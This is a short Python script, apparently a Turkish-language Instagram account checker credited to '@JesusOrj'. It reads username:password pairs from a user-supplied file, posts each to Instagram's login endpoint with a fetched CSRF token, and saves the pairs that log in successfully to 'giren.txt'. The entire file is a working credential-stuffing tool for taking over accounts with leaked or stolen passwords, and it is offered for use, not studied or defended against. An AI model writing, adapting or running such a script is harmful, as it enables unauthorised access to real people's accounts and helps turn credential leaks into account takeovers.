import requests
import colorama
from colorama import Fore, Style

colorama.init()

url = "https://www.instagram.com/accounts/login/ajax/"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "https://www.instagram.com/accounts/login/",
    "x-csrftoken": "missing"
}

def get_csrf():
    r = requests.get(url, headers=headers)
    return r.cookies["csrftoken"]

def login(user, pwd):
    csrf = get_csrf()
    headers["x-csrftoken"] = csrf
    data = {
        "username": user,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:0:{pwd}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }
    r = requests.post(url, headers=headers, data=data, cookies={"csrftoken": csrf})
    return r.json()

def check(file):
    with open(file, "r") as f:
        accounts = f.read().splitlines()
    with open("giren.txt", "w") as f:
        for account in accounts:
            user, pwd = account.split(":")
            try:
                result = login(user, pwd)
                if "authenticated" in result and result["authenticated"]:
                    print(Fore.GREEN + f"[+] {user}:{pwd} girdi. - @JesusOrj")
                    f.write(f"{user}:{pwd}\n")
                else:
                    print(Fore.RED + f"[-] {user}:{pwd} giremedi. - @JesusOrj")
            except Exception as e:
                print(Fore.RED + f"Hata: {e}")
    print(Style.RESET_ALL + "İşlem tamamlandı. - @JesusOrj")

if __name__ == "__main__":
    file = input("Lütfen dosya adı girin: ")
    check(file)
